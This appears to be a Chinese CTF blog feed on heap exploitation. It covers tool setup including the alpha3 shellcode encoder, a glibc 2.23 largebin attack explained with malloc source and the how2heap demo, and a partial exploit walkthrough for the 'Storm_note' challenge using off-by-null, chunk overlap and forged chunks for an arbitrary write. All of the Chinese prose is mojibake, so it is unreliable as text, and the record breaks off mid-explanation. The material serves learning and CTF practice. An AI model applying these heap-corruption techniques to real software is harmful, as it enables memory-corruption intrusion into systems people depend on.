å¦‚æœä¸Šè¿°åšå®¢ä¸­æ–¹æ³•ä¸å¯è¡Œï¼Œåˆ™å¯ä»¥ä¿®æ”¹~/pwndbg/pwndbg/symbol.py æœ€åä¸¤è¡Œä¸ºset_directory('./debug/')
</code></pre>
<h3 id="å®‰è£…å¹¶é…ç½®python2"><a class="header-anchor" href="#å®‰è£…å¹¶é…ç½®python2">Â¶</a>å®‰è£…å¹¶é…ç½®python2</h3>
<pre><code>#å®‰è£…
sudo apt install python2 
#è®¾ç½®ä¼˜å…ˆçº§
sudo update-alternatives --install /usr/bin/python python /usr/bin/python2.7 1 
sudo update-alternatives --install /usr/bin/python python /usr/bin/python3.8 2
#æ‰‹åŠ¨åˆ‡æ¢
sudo update-alternatives --config python
#å®‰è£…pipåŠä¾èµ–
sudo apt install  python-dev git libssl-dev libffi-dev build-essential
sudo apt-get install curl
sudo curl https://bootstrap.pypa.io/pip/2.7/get-pip.py -o get-pip.py
sudo python get-pip.py
pip install pwntoola
</code></pre>
<h3 id="å®‰è£…alpha3"><a class="header-anchor" href="#å®‰è£…alpha3">Â¶</a>å®‰è£…alpha3</h3>
<pre><code>git clone https://github.com/TaQini/alpha3.git
cd alpha3
python ./ALPHA3.py x64 ascii mixedcase rax --input=&quot;sc.bin&quot; &gt; out.bin
</code></pre>
<h3 id="æ­å»ºdockerç”¨çš„é•œåƒ"><a class="header-anchor" href="#æ­å»ºdockerç”¨çš„é•œåƒ">Â¶</a>æ­å»ºdockerç”¨çš„é•œåƒ</h3>
<pre><code>https://github.com/DASCTF-Base
</code></pre>
]]></content>
      <categories>
        <category>pwn</category>
      </categories>
      <tags>
        <tag>pwnç¬”è®°</tag>
        <tag>ç¯å¢ƒæ­å»º</tag>
      </tags>
  </entry>
  <entry>
    <title>largebin attack</title>
    <url>/2021/10/20/attack/</url>
    <content><![CDATA[<p><img src="https://gitee.com/Nss-harukii/images/raw/master/20.jpg" alt="pic"></p>
<span id="more"></span>
<h2 id="å‰è¨€"><a class="header-anchor" href="#å‰è¨€">Â¶</a>å‰è¨€.</h2>
<p>æœ€è¿‘åˆ·é¢˜é‡åˆ°å¥½å‡ é“éœ€è¦large bin attackçš„é¢˜ç›®ï¼Œä¸”ä¸€äº›æ¼æ´è”åˆåˆ©ç”¨çš„æ–¹å¼ä¹Ÿè¦ç”¨åˆ°large bin attack æ•…å†™æ­¤åšå®¢è®°å½•</p>
<h2 id="è®¤è¯†largebin"><a class="header-anchor" href="#è®¤è¯†largebin">Â¶</a>è®¤è¯†largebin</h2>
<p>å…ˆé€šè¿‡ä¸€ä¸ªç®€å•çš„demoæ¥è®¤è¯†largebin</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span>&#123;</span><br><span class="line">  <span class="keyword">int</span> * a = <span class="built_in">malloc</span>(<span class="number">0x430</span>);</span><br><span class="line">  <span class="built_in">malloc</span>(<span class="number">0x10</span>);</span><br><span class="line">  <span class="keyword">int</span> * b = <span class="built_in">malloc</span>(<span class="number">0x440</span>);</span><br><span class="line">  <span class="built_in">malloc</span>(<span class="number">0x10</span>);</span><br><span class="line">  <span class="keyword">int</span> * c = <span class="built_in">malloc</span>(<span class="number">0x450</span>);</span><br><span class="line">  <span class="built_in">malloc</span>(<span class="number">0x10</span>);</span><br><span class="line">  <span class="built_in">free</span>(b);</span><br><span class="line">  <span class="built_in">free</span>(c);</span><br><span class="line">  <span class="built_in">free</span>(a);</span><br><span class="line">  <span class="built_in">malloc</span>(<span class="number">0x1000</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p><img src="http://static.zybuluo.com/hgggg/8b80u3zx6g5mplinjtxv2z85/1.png" alt="1.png-136.7kB"></p>
<p>æ ¹æ®ä¸Šå›¾ï¼Œå¯ä»¥å¾—å‡ºï¼Œæ¯ä¸€ä¸ªlargebiné“¾è¡¨ä¸­ï¼Œå †å—ä»¥ä»å°åˆ°å¤§çš„é¡ºåºæ’åˆ—ï¼Œä¸”fdæŒ‡é’ˆæ€»æ˜¯æŒ‡å‘æ¯”è‡ªå·±å¤§çš„å †å—ï¼ˆæœ€åä¸€ä¸ªé™¤å¤–ï¼‰ï¼Œç›¸è¾ƒäºå…¶ä»–çš„binå¤šå‡ºæ¥fd_nextsize  å’Œ bk_nextsize æŒ‡é’ˆã€‚</p>
<p>largebinå›¾è§£<br>
<img src="http://static.zybuluo.com/hgggg/8bj2tnlhakh8e99uug0wjvxy/2.png" alt="2.png-139.3kB"></p>
<h2 id="2-23-mallac-æºç è§£æ"><a class="header-anchor" href="#2-23-mallac-æºç è§£æ">Â¶</a>2.23 mallac æºç è§£æ</h2>
<p>ä¸‹é¢å®åœ¨2.23ä¸‹çš„æœ‰å…³largebin çš„éƒ¨åˆ†æºç ï¼Œglibc2.27å’Œglibc2.23ç›¸ä¼¼ï¼Œåªæ˜¯çš„å¤šäº†æœ‰å…³tacaheçš„åˆ¤æ–­</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="keyword">for</span> (;; )</span><br><span class="line">    &#123;</span><br><span class="line">      <span class="keyword">int</span> iters = <span class="number">0</span>;</span><br><span class="line">      <span class="keyword">while</span> ((victim = unsorted_chunks (av)-&gt;bk) != unsorted_chunks (av))</span><br><span class="line">        &#123;</span><br><span class="line">          bck = victim-&gt;bk;</span><br><span class="line">          <span class="keyword">if</span> (__builtin_expect (victim-&gt;size &lt;= <span class="number">2</span> * SIZE_SZ, <span class="number">0</span>)</span><br><span class="line">              || __builtin_expect (victim-&gt;size &gt; av-&gt;system_mem, <span class="number">0</span>))</span><br><span class="line">            malloc_printerr (check_action, <span class="string">&quot;malloc(): memory corruption&quot;</span>,</span><br><span class="line">                             chunk2mem (victim), av);</span><br><span class="line">          size = chunksize (victim);</span><br><span class="line"></span><br><span class="line">          <span class="comment">/*</span></span><br><span class="line"><span class="comment">             If a small request, try to use last remainder if it is the</span></span><br><span class="line"><span class="comment">             only chunk in unsorted bin.  This helps promote locality for</span></span><br><span class="line"><span class="comment">             runs of consecutive small requests. This is the only</span></span><br><span class="line"><span class="comment">             exception to best-fit, and applies only when there is</span></span><br><span class="line"><span class="comment">             no exact fit for a small chunk.</span></span><br><span class="line"><span class="comment">           */</span></span><br><span class="line"></span><br><span class="line">          <span class="keyword">if</span> (in_smallbin_range (nb) &amp;&amp;</span><br><span class="line">              bck == unsorted_chunks (av) &amp;&amp;</span><br><span class="line">              victim == av-&gt;last_remainder &amp;&amp;</span><br><span class="line">              (<span class="keyword">unsigned</span> <span class="keyword">long</span>) (size) &gt; (<span class="keyword">unsigned</span> <span class="keyword">long</span>) (nb + MINSIZE))</span><br><span class="line">            &#123;</span><br><span class="line">              <span class="comment">/* split and reattach remainder */</span></span><br><span class="line">              remainder_size = size - nb;</span><br><span class="line">              remainder = chunk_at_offset (victim, nb);</span><br><span class="line">              unsorted_chunks (av)-&gt;bk = unsorted_chunks (av)-&gt;fd = remainder;</span><br><span class="line">              av-&gt;last_remainder = remainder;</span><br><span class="line">              remainder-&gt;bk = remainder-&gt;fd = unsorted_chunks (av);</span><br><span class="line">              <span class="keyword">if</span> (!in_smallbin_range (remainder_size))</span><br><span class="line">                &#123;</span><br><span class="line">                  remainder-&gt;fd_nextsize = <span class="literal">NULL</span>;</span><br><span class="line">                  remainder-&gt;bk_nextsize = <span class="literal">NULL</span>;</span><br><span class="line">                &#125;</span><br><span class="line"></span><br><span class="line">              set_head (victim, nb | PREV_INUSE |</span><br><span class="line">                        (av != &amp;main_arena ? NON_MAIN_ARENA : <span class="number">0</span>));</span><br><span class="line">              set_head (remainder, remainder_size | PREV_INUSE);</span><br><span class="line">              set_foot (remainder, remainder_size);</span><br><span class="line"></span><br><span class="line">              check_malloced_chunk (av, victim, nb);</span><br><span class="line">              <span class="keyword">void</span> *p = chunk2mem (victim);</span><br><span class="line">              alloc_perturb (p, bytes);</span><br><span class="line">              <span class="keyword">return</span> p;</span><br><span class="line">            &#125;</span><br><span class="line"></span><br><span class="line">          <span class="comment">/* remove from unsorted list */</span></span><br><span class="line">          unsorted_chunks (av)-&gt;bk = bck;</span><br><span class="line">          bck-&gt;fd = unsorted_chunks (av);</span><br><span class="line"></span><br><span class="line">          <span class="comment">/* Take now instead of binning if exact fit */</span></span><br><span class="line"></span><br><span class="line">          <span class="keyword">if</span> (size == nb)</span><br><span class="line">            &#123;</span><br><span class="line">              set_inuse_bit_at_offset (victim, size);</span><br><span class="line">              <span class="keyword">if</span> (av != &amp;main_arena)</span><br><span class="line">                victim-&gt;size |= NON_MAIN_ARENA;</span><br><span class="line">              check_malloced_chunk (av, victim, nb);</span><br><span class="line">              <span class="keyword">void</span> *p = chunk2mem (victim);</span><br><span class="line">              alloc_perturb (p, bytes);</span><br><span class="line">              <span class="keyword">return</span> p;</span><br><span class="line">            &#125;</span><br><span class="line"></span><br><span class="line">          <span class="comment">/* place chunk in bin */</span></span><br><span class="line"></span><br><span class="line">          <span class="keyword">if</span> (in_smallbin_range (size))</span><br><span class="line">            &#123;</span><br><span class="line">              victim_index = smallbin_index (size);</span><br><span class="line">              bck = bin_at (av, victim_index);</span><br><span class="line">              fwd = bck-&gt;fd;</span><br><span class="line">            &#125;</span><br><span class="line">          <span class="keyword">else</span></span><br><span class="line">            &#123;</span><br><span class="line">              victim_index = largebin_index (size);</span><br><span class="line">              bck = bin_at (av, victim_index);</span><br><span class="line">              fwd = bck-&gt;fd;</span><br><span class="line"></span><br><span class="line">              <span class="comment">/* maintain large bins in sorted order */</span></span><br><span class="line">              <span class="keyword">if</span> (fwd != bck)</span><br><span class="line">                &#123;</span><br><span class="line">                  <span class="comment">/* Or with inuse bit to speed comparisons */</span></span><br><span class="line">                  size |= PREV_INUSE;</span><br><span class="line">                  <span class="comment">/* if smaller than smallest, bypass loop below */</span></span><br><span class="line">                  assert ((bck-&gt;bk-&gt;size &amp; NON_MAIN_ARENA) == <span class="number">0</span>);</span><br><span class="line">                  <span class="keyword">if</span> ((<span class="keyword">unsigned</span> <span class="keyword">long</span>) (size) &lt; (<span class="keyword">unsigned</span> <span class="keyword">long</span>) (bck-&gt;bk-&gt;size))</span><br><span class="line">                    &#123;</span><br><span class="line">                      fwd = bck;</span><br><span class="line">                      bck = bck-&gt;bk;</span><br><span class="line"></span><br><span class="line">                      victim-&gt;fd_nextsize = fwd-&gt;fd;</span><br><span class="line">                      victim-&gt;bk_nextsize = fwd-&gt;fd-&gt;bk_nextsize;</span><br><span class="line">                      fwd-&gt;fd-&gt;bk_nextsize = victim-&gt;bk_nextsize-&gt;fd_nextsize = victim;</span><br><span class="line">                    &#125;</span><br><span class="line">                  <span class="keyword">else</span></span><br><span class="line">                    &#123;</span><br><span class="line">                      assert ((fwd-&gt;size &amp; NON_MAIN_ARENA) == <span class="number">0</span>);</span><br><span class="line">                      <span class="keyword">while</span> ((<span class="keyword">unsigned</span> <span class="keyword">long</span>) size &lt; fwd-&gt;size)</span><br><span class="line">                        &#123;</span><br><span class="line">                          fwd = fwd-&gt;fd_nextsize;</span><br><span class="line">                          assert ((fwd-&gt;size &amp; NON_MAIN_ARENA) == <span class="number">0</span>);</span><br><span class="line">                        &#125;</span><br><span class="line"></span><br><span class="line">                      <span class="keyword">if</span> ((<span class="keyword">unsigned</span> <span class="keyword">long</span>) size == (<span class="keyword">unsigned</span> <span class="keyword">long</span>) fwd-&gt;size)</span><br><span class="line">                        <span class="comment">/* Always insert in the second position.  */</span></span><br><span class="line">                        fwd = fwd-&gt;fd;</span><br><span class="line">                      <span class="keyword">else</span></span><br><span class="line">                        &#123;</span><br><span class="line">                          victim-&gt;fd_nextsize = fwd;</span><br><span class="line">                          victim-&gt;bk_nextsize = fwd-&gt;bk_nextsize;</span><br><span class="line">                          fwd-&gt;bk_nextsize = victim;</span><br><span class="line">                          victim-&gt;bk_nextsize-&gt;fd_nextsize = victim;</span><br><span class="line">                        &#125;</span><br><span class="line">                      bck = fwd-&gt;bk;</span><br><span class="line">                    &#125;</span><br><span class="line">                &#125;</span><br><span class="line">              <span class="keyword">else</span></span><br><span class="line">                victim-&gt;fd_nextsize = victim-&gt;bk_nextsize = victim;</span><br><span class="line">            &#125;</span><br><span class="line"></span><br><span class="line">          mark_bin (av, victim_index); </span><br><span class="line">          victim-&gt;bk = bck;</span><br><span class="line">          victim-&gt;fd = fwd;</span><br><span class="line">          fwd-&gt;bk = victim;</span><br><span class="line">          bck-&gt;fd = victim;</span><br></pre></td></tr></table></figure>
<p>è¿™æ®µä»£ç æ˜¯åˆ¤æ–­å°†chunkä»unsorted binä¸­è„±ç¦»å‡ºæ¥è¿›å…¥åˆ°æ‰€å±binçš„è¿‡ç¨‹ï¼Œå¦‚æœchunkçš„å¤§å°åœ¨0x400ä»¥ä¸Šï¼Œå°±ä¼šæŠŠchunkåˆ†é…åˆ°largebinä¸­</p>
<p>æ¥ä¸‹æ¥å°±æ˜¯å…³é”®ï¼š ç”±äºlargebinä¸­éœ€è¦æ»¡è¶³chunkä»å°åˆ°å¤§ç­‰é¡ºåºæ’åˆ—ï¼Œæ‰€ä»¥å½“ä¸€ä¸ªchunkå½’å…¥largebinæ—¶ï¼Œä¼šå­˜åœ¨ä¸€ä¸ªè§£é“¾çš„æ“ä½œ</p>
<p>åœ¨ä»£ç çš„110è¡Œåˆ°ç¬¬113è¡Œ</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line">victim-&gt;fd_nextsize = fwd;</span><br><span class="line">victim-&gt;bk_nextsize = fwd-&gt;bk_nextsize;</span><br><span class="line">fwd-&gt;bk_nextsize = victim;</span><br><span class="line">victim-&gt;bk_nextsize-&gt;fd_nextsize = victim;</span><br></pre></td></tr></table></figure>
<p>å½“è§£é“¾çš„æ—¶å€™ä¼šæœ‰victim-&gt;bk_nextsize-&gt;fd_nextsize = victim å³ fwd-&gt;bk_nextsize-&gt;fd_nextsize=victim</p>
<p>è€Œåœ¨æœ€åæœ‰</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line">victim-&gt;bk = bck;</span><br><span class="line">victim-&gt;fd = fwd;</span><br><span class="line">fwd-&gt;bk = victim;</span><br><span class="line">bck-&gt;fd = victim;</span><br></pre></td></tr></table></figure>
<p>å¯ä»¥çœ‹åˆ°bck-&gt;fd = victim,å³fwd-&gt;bk-&gt;fd = victim</p>
<p>ç»¼ä¸Šï¼Œå¦‚æœå¯ä»¥æ§åˆ¶bkå’Œbk_nextsizeçš„å€¼ï¼Œå°±å¯ä»¥å®ç°ä»»æ„åœ°å€å†™</p>
<h2 id="how2heap-largebin-attack-for-2-23"><a class="header-anchor" href="#how2heap-largebin-attack-for-2-23">Â¶</a>how2heap largebin attack for 2.23</h2>
<p>ä»£ç </p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="comment">// gcc large_bin_attack.c -o large_bin_attack -g</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="keyword">unsigned</span> <span class="keyword">long</span> stack_var1 = <span class="number">0</span>;</span><br><span class="line">    <span class="keyword">unsigned</span> <span class="keyword">long</span> stack_var2 = <span class="number">0</span>;</span><br><span class="line">    <span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">&quot;stack_var1 (%p): %ld\n&quot;</span>, &amp;stack_var1, stack_var1);</span><br><span class="line">    <span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">&quot;stack_var2 (%p): %ld\n\n&quot;</span>, &amp;stack_var2, stack_var2);</span><br><span class="line">    <span class="keyword">unsigned</span> <span class="keyword">long</span> *p1 = <span class="built_in">malloc</span>(<span class="number">0x320</span>);</span><br><span class="line">    <span class="built_in">malloc</span>(<span class="number">0x20</span>);</span><br><span class="line">    <span class="keyword">unsigned</span> <span class="keyword">long</span> *p2 = <span class="built_in">malloc</span>(<span class="number">0x400</span>);</span><br><span class="line">    <span class="built_in">malloc</span>(<span class="number">0x20</span>);</span><br><span class="line">    <span class="keyword">unsigned</span> <span class="keyword">long</span> *p3 = <span class="built_in">malloc</span>(<span class="number">0x400</span>);</span><br><span class="line">    <span class="built_in">malloc</span>(<span class="number">0x20</span>);</span><br><span class="line">    <span class="built_in">free</span>(p1);</span><br><span class="line">    <span class="built_in">free</span>(p2);</span><br><span class="line">    <span class="keyword">void</span>* p4 = <span class="built_in">malloc</span>(<span class="number">0x90</span>);</span><br><span class="line">    <span class="built_in">free</span>(p3);</span><br><span class="line">    p2[<span class="number">-1</span>] = <span class="number">0x3f1</span>;  <span class="comment">//p2-&gt;size</span></span><br><span class="line">    p2[<span class="number">0</span>] = <span class="number">0</span>;       <span class="comment">//p2-&gt;fd</span></span><br><span class="line">    p2[<span class="number">2</span>] = <span class="number">0</span>;       <span class="comment">//p2-&gt;fd_nextsize</span></span><br><span class="line">    p2[<span class="number">1</span>] = (<span class="keyword">unsigned</span> <span class="keyword">long</span>)(&amp;stack_var1 - <span class="number">2</span>);  <span class="comment">//p2-&gt;bk</span></span><br><span class="line">    p2[<span class="number">3</span>] = (<span class="keyword">unsigned</span> <span class="keyword">long</span>)(&amp;stack_var2 - <span class="number">4</span>);  <span class="comment">//p2-&gt;bk_nextsize</span></span><br><span class="line">    <span class="built_in">malloc</span>(<span class="number">0x90</span>);</span><br><span class="line">    <span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">&quot;stack_var1 (%p): %p\n&quot;</span>, &amp;stack_var1, (<span class="keyword">void</span> *)stack_var1);</span><br><span class="line">    <span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">&quot;stack_var2 (%p): %p\n&quot;</span>, &amp;stack_var2, (<span class="keyword">void</span> *)stack_var2);</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>ç¨‹åºåˆ†æ</p>
<p>Step0: å®šä¹‰stack_var1,stack_var2å¹¶ä¸”èµ‹å€¼ä¸º0</p>
<p>Step1: ç”³è¯·p1=0x320,p2=0x400,p3=0x400</p>
<p>Step2: é‡Šæ”¾æ‰p1,p2è¿›å…¥unsorted bin</p>
<p>Step3: ç”³è¯·p4=0x90,æ­¤æ—¶å‘ç”Ÿunsorted binéå†ï¼Œä»p1åˆ‡å‰²0xa0å¤§å°åˆ†é…ç»™p4,åŒæ—¶ç”±äºp2&gt;0x3f0,ç›´æ¥è¿›å…¥largebin</p>
<p>Step4: é‡Šæ”¾p3è¿›å…¥unsorted bin</p>
<p>Step5: ä¿®æ”¹p2çš„size=0x3f1,fd,fd_nextsize=0,p2-&gt;bk=&amp;stack_var1-2(stack_var1å³ä¸ºfake chunk1çš„fd),p2-&gt;bk_nextsize=&amp;stack_var2-4(stack_var2å³ä¸ºfake chunk2çš„fd_nextsize)</p>
<p>Step6ï¼šmalloc(0x90),å‘ç”Ÿunsorted binéå†,ä»p1åˆ†å‰²0xa0,p3&gt;0x3f0ä¸”p3&gt;p2,ä¼šè¿›è¡Œè§£é“¾æ“ä½œå³p2-&gt;bk_nextsize-&gt;fd_nextsize = p3,p2-&gt;bk-&gt;fd=p3ï¼Œå³å‘fake chunk1çš„fd å’Œ fake chunk2çš„fd_nextszie , å†™å…¥äº†p3å¤´æŒ‡é’ˆçš„å€¼ï¼Œå³å°†stack_var1 å’Œ stack_va2ä¿®æ”¹ä¸ºäº†p3çš„å¤´æŒ‡é’ˆ</p>
<h2 id="åˆ—é¢˜1"><a class="header-anchor" href="#åˆ—é¢˜1">Â¶</a>åˆ—é¢˜1</h2>
<h3 id="2019è¥¿æ¹–è®ºå‰‘Storm-note"><a class="header-anchor" href="#2019è¥¿æ¹–è®ºå‰‘Storm-note">Â¶</a>2019è¥¿æ¹–è®ºå‰‘Storm_note</h3>
<h4 id="é¢˜ç›®è€ƒç‚¹"><a class="header-anchor" href="#é¢˜ç›®è€ƒç‚¹">Â¶</a>é¢˜ç›®è€ƒç‚¹</h4>
<pre><code>1.largebin attack
2.chunk overlap
3.off by null
</code></pre>
<p>æœ¬é¢˜æ‰€è¡ç”Ÿçš„ä¸€ç³»åˆ—æ¼æ´åˆ©ç”¨æ–¹æ³•ï¼Œä¹Ÿå°±æ˜¯house of storm</p>
<h4 id="é¢˜ç›®åˆ†æ"><a class="header-anchor" href="#é¢˜ç›®åˆ†æ">Â¶</a>é¢˜ç›®åˆ†æ</h4>
<p>init<br>
<img src="http://static.zybuluo.com/hgggg/nuka4g6wb1f0exchdwyek2r9/3.png" alt="3.png-39.4kB"><br>
add<br>
<img src="http://static.zybuluo.com/hgggg/x0ce4dol8bgv4y7hfke8dumj/4.png" alt="4.png-32.4kB"><br>
addå‡½æ•°ç”¨çš„æ˜¯calloc,ä¸mallocä¸åŒï¼Œcallocä¼šå¯¹ç”³è¯·åˆ°çš„ç©ºé—´åšåˆå§‹åŒ–æ“ä½œ<br>
edit<br>
<img src="http://static.zybuluo.com/hgggg/gue1ojamwlxa8046dvxgyi0x/image_1fieomqgj1st9rdh4c5qkqn99.png" alt="image_1fieomqgj1st9rdh4c5qkqn99.png-37.2kB"><br>
ï¼ˆ(_BYTE )(note[v1] + v2) = 0;ï¼‰å­˜åœ¨off by null<br>
backdoor<br>
<img src="http://static.zybuluo.com/hgggg/kf4kzl4bbz4b4r8d7xyz7y81/image.png" alt="image.png-19.4kB"><br>
å½“æ¡ä»¶æ»¡è¶³æ—¶å¯ä»¥getshell</p>
<h4 id="è§£é¢˜æ­¥éª¤"><a class="header-anchor" href="#è§£é¢˜æ­¥éª¤">Â¶</a>è§£é¢˜æ­¥éª¤</h4>
<p>Step1ï¼šæ„é€ overlap chunk</p>
<p>ç”³è¯·å †å—å¦‚ä¸‹</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">add(<span class="number">0x18</span>)  <span class="comment">#0</span></span><br><span class="line">add(<span class="number">0x508</span>) <span class="comment">#1</span></span><br><span class="line">add(<span class="number">0x18</span>)  <span class="comment">#2</span></span><br><span class="line">add(<span class="number">0x18</span>)  <span class="comment">#3</span></span><br><span class="line">add(<span class="number">0x508</span>) <span class="comment">#4</span></span><br><span class="line">add(<span class="number">0x18</span>)  <span class="comment">#5</span></span><br><span class="line">add(<span class="number">0x18</span>)  <span class="comment">#6</span></span><br></pre></td></tr></table></figure>
<p>å…¶ä¸­chunk2ï¼Œchunk4æ˜¯æˆ‘ä»¬ç­‰ä¸‹éœ€è¦åˆ©ç”¨overlapæ§åˆ¶çš„chunkï¼Œchunk6ä¸ºäº†é˜²æ­¢å †å—åˆå¹¶</p>
<p>overlapping</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">edit(1,b&#x27;a&#x27;*0x4f0+p64(0x500)) #ä¿®æ”¹prve_sizeï¼Œç¡®ä¿å †å—çš„åˆæ³•æ€§</span><br><span class="line">free(1)</span><br><span class="line">edit(0,b&#x27;a&#x27;*0x18) #off by null</span><br><span class="line">add(0x18)    #1</span><br><span class="line">add(0x4d8)   #7 </span><br><span class="line">free(1)</span><br><span class="line">free(2)   </span><br><span class="line">add(0x30)   #1</span><br><span class="line">add(0x4e0)  #2</span><br></pre></td></tr></table></figure>
<p>æ­¤æ—¶ï¼Œå¯ä»¥é€šè¿‡chunk7,æ¥æ§åˆ¶chunk2ä¸­çš„å†…å®¹</p>
<p>æ¢…å¼€äºŒåº¦</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">edit(<span class="number">4</span>,<span class="string">b&#x27;a&#x27;</span>*<span class="number">0x4f0</span>+p64(<span class="number">0x500</span>))</span><br><span class="line">free(<span class="number">4</span>)</span><br><span class="line">edit(<span class="number">3</span>,<span class="string">b&#x27;a&#x27;</span>*<span class="number">0x18</span>) <span class="comment">#off by null</span></span><br><span class="line">add(<span class="number">0x18</span>)     <span class="comment">#4</span></span><br><span class="line">add(<span class="number">0x4d8</span>)    <span class="comment">#8 </span></span><br><span class="line">free(<span class="number">4</span>)</span><br><span class="line">free(<span class="number">5</span>)       <span class="comment">#overlap</span></span><br><span class="line">add(<span class="number">0x40</span>)     <span class="comment">#4</span></span><br></pre></td></tr></table></figure>
<p>è¿™é‡Œadd(0x40)æ˜¯ä¸ºäº†ç­‰ä¸‹large chunkçš„å¤§å°ä¸åŒè§¦å‘è§£é“¾æ“ä½œ</p>
<p>Step2 largebin attack</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">free(<span class="number">2</span>)   </span><br><span class="line">add(<span class="number">0x4e8</span>)    <span class="comment">#2</span></span><br><span class="line">free(<span class="number">2</span>) </span><br></pre></td></tr></table></figure>
<p>å½“add(0x4e8)æ—¶ï¼Œä¼šå‘ç”Ÿunsorted binçš„éå†ï¼Œç”±äº0x4e8&gt;chunk4=0x4e0ï¼Œä¼šç»§ç»­å‘åéå†ï¼Œå› ä¸ºchunk2=0x4f0,åˆšå¥½æ»¡è¶³æ¡ä»¶ï¼Œæ‰€ä»¥chunk2ä¼šè¢«ç”³è¯·å‡ºæ¥ï¼Œè€Œchunk4åˆ™ä¼šè¢«æ”¾å…¥largebin,è®©åå†å°†chunk2æ”¾å…¥unsorted binäºŒæ¬¡åˆ©ç”¨</p>
<p>ä¼ªé€ fake chunk</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">content_addr = <span class="number">0xabcd0100</span></span><br><span class="line">fake_chunk = content_addr - <span class="number">0x20</span></span><br><span class="line"></span><br><span class="line">payload = p64(<span class="number">0</span>)*<span class="number">2</span> + p64(<span class="number">0</span>) + p64(<span class="number">0x4f1</span>) </span><br><span class="line">payload += p64(<span class="number">0</span>) + p64(fake_chunk)      </span><br><span class="line">edit(<span class="number">7</span>,payload)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">payload2 = p64(<span class="number">0</span>)*<span class="number">4</span> + p64(<span class="number">0</span>) + p64(<span class="number">0x4e1</span>) </span><br><span class="line">payload2 += p64(<span class="number">0</span>) + p64(fake_chunk+<span class="number">8</span>)   </span><br><span class="line">payload2 += p64(<span class="number">0</span>) + p64(fake_chunk-<span class="number">0x18</span>-<span class="number">5</span>)</span><br><span class="line"></span><br><span class="line">edit(<span class="number">8</span>,payload2)</span><br><span class="line"></span><br><span class="line">add(<span class="number">0x48</span>)</span><br></pre></td></tr></table></figure>
<p>ç”±äºä¼ªé€ unsorted bin çš„ bkæ—¶ï¼Œæˆ‘ä»¬æ•…æ„å‘ä¸Šåç§»äº†0x20å­—èŠ‚ï¼Œæ‰€ä»¥å¾—åˆ°çš„sizeå°±æ˜¯0ï¼Œç”±äºä¸å¤Ÿç”³è¯·çš„sizeï¼Œè½¬è€Œè¿›å…¥large bin åˆ¤æ–­éƒ¨åˆ†ã€‚ç„¶åè¿›è¡Œä¸€ç³»åˆ—çš„é“¾æ¥æ“ä½œã€‚æœ€åæˆ‘ä»¬ä¼šåˆ†é…åˆ°0xabcd00f0 åœ°å€ã€‚</p>
<p>ä¸ºä»€ä¹ˆè¦ä¼ªé€ p64(fake_chunk-0x18-5): ç”±äºvictim-&gt;bk_nextsizeçš„åœ°å€å°±æ˜¯(size_t)fake_chunk - 0x18 - 5çš„å€¼ï¼Œé‚£ä¹ˆå°±ç›¸å½“äºæˆ‘ä»¬æœ‰ä¸€æ¬¡ä»»æ„åœ°å€å†™çš„æœºä¼šï¼Œé‚£ä¹ˆè‚¯å®šæ˜¯ç”¨æ¥æ„é€ æˆ‘ä»¬çš„sizeï¼Œä»¥ä¾¿åœ¨ç¬¬äºŒæ¬¡è§£é“¾çš„æ—¶å€™ç›´æ¥è¿”å›ä»»æ„chunkã€‚<br>
0x18å°±æ˜¯ä¸€ä¸ªchunkçš„fd_nextsizeçš„åç§»ï¼Œå› ä¸ºä¸Šé¢çš„ä»£ç æ˜¯è¦æŠŠvictimå†™åœ¨è¿™é‡Œï¼Œæ‰€ä»¥æˆ‘ä»¬éœ€è¦æå–å‘å‰åç§»0x18ï¼Œè€Œ- 5å°±æ˜¯ä¸ºäº†ä¼ªé€ sizeï¼Œåœ¨å¼€å¯PIEçš„æƒ…å†µä¸‹ï¼Œä¸€èˆ¬victimçš„å€¼åœ¨0x555555756000é™„è¿‘å·¦å³ï¼Œå½“åç§»5ä¸ªå­—èŠ‚ä¹‹åï¼Œé‚£ä¹ˆå†™å…¥sizeçš„åœ°å€å°±åˆšå¥½æ˜¯0x55ï¼Œç”±äºå—éšæœºåŒ–çš„å½±å“è¿™ä¸ªå€¼ä¼šç¨å¾®æœ‰ç‚¹å˜åŠ¨ã€‚ï¼ˆæ‘˜è‡ªEXå¸ˆå‚…çš„åšå®¢ï¼‰</p>
<p>ä¸‹å›¾ä¸ºæˆ‘ä»¬ç”³è¯·åˆ°çš„fake chunk,å…¶sizeä¸ºæ˜¯0x56,ç»è¿‡mallocå¯¹å…¶åå…¶sizeä¼šè¢«å¯¹é½ä¸º0x50ï¼Œæ‰€ä»¥æˆ‘ä»¬addçš„æ—¶å€™è¦åœ¨0x40~0x48ä¹‹é—´<br>
